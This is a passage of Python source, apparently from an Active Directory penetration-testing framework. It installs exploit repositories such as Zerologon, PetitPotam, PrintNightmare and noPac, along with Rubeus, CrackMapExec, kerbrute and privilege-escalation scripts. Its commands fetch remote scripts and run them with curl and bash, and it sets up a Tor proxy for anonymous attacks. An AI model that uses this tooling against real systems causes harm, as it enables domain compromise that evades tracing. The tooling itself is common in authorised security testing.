            'CVE-2020-1472': {
                'url': 'https://github.com/SecuraBV/CVE-2020-1472.git',
                'path': self.tools_dir / 'CVE-2020-1472',
            },
            'PetitPotam': {
                'url': 'https://github.com/topotam/PetitPotam.git',
                'path': self.tools_dir / 'PetitPotam',
            },
            'CVE-2021-1675': {
                'url': 'https://github.com/cube0x0/CVE-2021-1675.git',
                'path': self.tools_dir / 'CVE-2021-1675',
            },
            'noPac': {
                'url': 'https://github.com/Ridter/noPac.git',
                'path': self.tools_dir / 'noPac',
            },
            'Rubeus': {
                'url': 'https://github.com/GhostPack/Rubeus.git',
                'path': self.tools_dir / 'Rubeus',
            },
            'CrackMapExec': {
                'url': 'https://github.com/byt3bl33d3r/CrackMapExec.git',
                'path': self.tools_dir / 'CrackMapExec',
                'install': 'pip3 install -r requirements.txt && pip3 install .'
            },
        }

        required_pip = {
            'bloodhound': 'pip3 install bloodhound',
            'ldapdomaindump': 'pip3 install ldapdomaindump',
        }

        required_downloads = {
            'kerbrute': {
                'url': 'https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64',
                'path': self.tools_dir / 'kerbrute',
                'post': 'chmod +x {path}'
            },
            'linpeas.sh': {
                'url': 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh',
                'path': self.tools_dir / 'linpeas.sh',
                'post': 'chmod +x {path}'
            },
            'winpeas.exe': {
                'url': 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe',
                'path': self.tools_dir / 'winpeas.exe',
            },
            'PowerView.ps1': {
                'url': 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
                'path': self.tools_dir / 'PowerView.ps1',
            },
            'AdFind': {
                'url': 'http://www.joeware.net/downloads/files/AdFind.zip',
                'path': self.tools_dir / 'AdFind.zip',
                'post': 'unzip -o {path} -d {dir} && chmod +x {dir}/AdFind.exe'
            },
            'PingCastle': {
                'url': 'https://github.com/vletoux/pingcastle/releases/download/3.3.0.1/PingCastle_3.3.0.1.zip',
                'path': self.tools_dir / 'PingCastle.zip',
                'post': 'unzip -o {path} -d {dir}'
            },
            'tgpt': {
                'url': 'https://raw.githubusercontent.com/aandrew-me/tgpt/main/install',
                'path': self.tools_dir / 'tgpt_install.sh',
                'post': 'bash {path} /usr/local/bin'
            },
        }

        missing_bin = []
        for bin_name, install_cmd in required_binaries.items():
            if not shutil.which(bin_name):
                missing_bin.append((bin_name, install_cmd))

        missing_git = []
        for name, info in required_git.items():
            if not (info['path'] / '.git').exists():
                missing_git.append((name, info))

        missing_pip = []
        for pkg, install_cmd in required_pip.items():
            success, _ = self.run_command(f"pip3 show {pkg}", silent=True)
            if not success:
                missing_pip.append((pkg, install_cmd))

        missing_dl = []
        for name, info in required_downloads.items():
            if not info['path'].exists():
                missing_dl.append((name, info))

        all_installed = not (missing_bin or missing_git or missing_pip or missing_dl)
        if all_installed:
            print("[+] All required tools and requirements are installed!")
            if self.anonymous:
                self.configure_proxychains()
            input("\nPress Enter to continue...")
            return

        print("[!] Some tools are missing:")
        if missing_bin:
            print("\nMissing binaries:")
            for bin_name, _ in missing_bin:
                print(f"- {bin_name}")

        if missing_git:
            print("\nMissing git repositories:")
            for name, _ in missing_git:
                print(f"- {name}")

        if missing_pip:
            print("\nMissing pip packages:")
            for pkg, _ in missing_pip:
                print(f"- {pkg}")

        if missing_dl:
            print("\nMissing downloads:")
            for name, _ in missing_dl:
                print(f"- {name}")

        print("\nYou can install missing tools manually using the following commands:")
        if missing_bin:
            for _, install_cmd in missing_bin:
                print(f"- {install_cmd}")

        if missing_git:
            for _, info in missing_git:
                clone_cmd = f"git clone {info['url']} {info['path']}"
                print(f"- {clone_cmd}")
                if 'install' in info:
                    install_cmd = f"cd {info['path']} && {info['install']}"
                    print(f"- {install_cmd}")

        if missing_pip:
            for _, install_cmd in missing_pip:
                print(f"- {install_cmd}")

        if missing_dl:
            for _, info in missing_dl:
                download_cmd = f"curl -L -o {info['path']} {info['url']}"
                print(f"- {download_cmd}")
                if 'post' in info:
                    post_dir = self.tools_dir / name if name in ['AdFind', 'PingCastle'] else self.tools_dir
                    post_cmd = info['post'].format(path=str(info['path']), dir=str(post_dir))
                    print(f"- {post_cmd}")

        while True:
            confirm = input("\nDo you want to attempt automatic installation of missing tools? (y/N): ").lower().strip()
            if confirm in ['y', 'yes']:
                break
            elif confirm in ['n', 'no']:
                print("[+] Please install the missing tools manually and try again.")
                input("\nPress Enter to continue...")
                return
            else:
                print("[!] Please enter y or n.")

        if confirm in ['y', 'yes']:
            for bin_name, install_cmd in missing_bin:
                print(f"\n[*] Installing {bin_name}...")
                self.run_command(install_cmd, bin_name)

            for name, info in missing_git:
                print(f"\n[*] Cloning {name}...")
                clone_cmd = f"git clone {info['url']} {info['path']}"
                self.run_command(clone_cmd, name)
                if 'install' in info:
                    install_cmd = f"cd {info['path']} && {info['install']}"
                    self.run_command(install_cmd, f"{name} dependencies")

            for pkg, install_cmd in missing_pip:
                print(f"\n[*] Installing {pkg}...")
                self.run_command(install_cmd, pkg)

            for name, info in missing_dl:
                print(f"\n[*] Downloading {name}...")
                download_cmd = f"curl -L -o {info['path']} {info['url']}"
                self.run_command(download_cmd, name)
                if 'post' in info:
                    post_dir = self.tools_dir / name if name in ['AdFind', 'PingCastle'] else self.tools_dir
                    post_cmd = info['post'].format(path=str(info['path']), dir=str(post_dir))
                    self.run_command(post_cmd, f"{name} post-install")

            if not shutil.which('gowitness'):
                print("\n[*] Installing GoWitness...")
                gw_cmd = "go install github.com/sensepost/gowitness@latest"
                self.run_command(gw_cmd, "GoWitness")

            if not shutil.which('evil-winrm'):
                print("\n[*] Installing evil-winrm...")
                ew_cmd = "gem install evil-winrm"
                self.run_command(ew_cmd, "evil-winrm")

            if not shutil.which('cme') and (self.tools_dir / 'CrackMapExec').exists():
                print("\n[*] Installing CrackMapExec...")
                cme_install = f"cd {self.tools_dir / 'CrackMapExec'} && pip3 install ."
                self.run_command(cme_install, "CrackMapExec")

            if self.anonymous:
                self.configure_proxychains()

            with open(self.install_log, 'a') as f:
                f.write(f"Tools installed on {time.ctime()}\n")

            print("\n[+] Installation attempt completed. Please re-run the check to verify.")
        input("\nPress Enter to continue...")

    def configure_proxychains(self):
        """Configure proxychains4 with a proxy"""
        proxychains_conf = "/etc/proxychains4.conf"
        print("\n[*] Configuring proxychains4...")
        proxy = input("Enter proxy for proxychains4 (e.g., socks5 127.0.0.1 9050 for Tor, or press Enter for default): ").strip() or "socks5 127.0.0.1 9050"
        try:
            with open(proxychains_conf, 'a') as f:
                f.write(f"\n{proxy}\n")
            print(f"[+] Added {proxy} to {proxychains_conf}")
            print("[!] Ensure the proxy service (e.g., Tor) is running: sudo systemctl start tor")
        except Exception as e:
            print(f"[!] Error configuring {proxychains_conf}: {e}")
            print("[!] Anonymous mode may not work. Configure manually or disable anonymous mode.")

    def tgpt_help(self):
        """Use tgpt for help on problems"""
        if shutil.which('tgpt'):
            question = input("Enter your question for tgpt: ").strip()
            if question:
                tgpt_cmd = f"tgpt \"{question}\""
                success, output = self.run_command(tgpt_cmd, "tgpt", use_sudo=True)
                if success:
                    print("\n[+] tgpt Response:")
                    print(output)
                    self.scan_results['tgpt'] = output
                    self.save_output("tgpt", output, f"tgpt_response_{int(time.time())}")
                else:
                    print(f"[!] tgpt failed: {output}")
            else:
                print("[!] No question provided for tgpt.")
        else:
            print("[!] tgpt not installed. Please install it from the setup menu.")
        input("\nPress Enter to continue...")

    def setup_menu(self):
        """Setup menu for tool installation and setup"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print("""
╔═══════════════════════════════════════════════╗
║                   Setup Menu                  ║
╠═══════════════════════════════════════════════╣
║ 1. Check and Install Tools                    ║
║ 2. Back to Main Menu                          ║
╚═══════════════════════════════════════════════╝
            """)
            
            choice = input("Select option (1-2): ").strip()
            
            if choice == '1':
                self.install_tools()
            elif choice == '2':
                return
            else:
                print("[!] Invalid option. Please try again.")
                time.sleep(1)

    def main_menu(self):
        """Main menu interface"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print("""
╔═══════════════════════════════════════════════╗
║                   Main Menu                   ║
╠═══════════════════════════════════════════════╣
║ 1. Tool Installation and Setup               ║
║ 2. Start Penetration Testing                 ║
║ 3. Ask GPT for Help (tgpt)                   ║
║ 4. Exit                                      ║
╚═══════════════════════════════════════════════╝
            """)
            
            choice = input("Select option (1-4): ").strip()
            
            if choice == '1':
                self.setup_menu()
            elif choice == '2':
                self.start_penetration_testing()
            elif choice == '3':
                self.tgpt_help()
            elif choice == '4':
                print("\n[+] Thank you for using AD-PenTest Framework!")
                sys.exit(0)
            else:
                print("[!] Invalid option. Please try again.")
                time.sleep(1)

def main():
    """Main function"""
    if sys.version_info < (3, 6):
        print("[!] Python 3.6 or higher is required")
        sys.exit(1)
        
    framework = ADPenTestFramework()
    framework.main_menu()

if __name__ == "__main__":
    main()
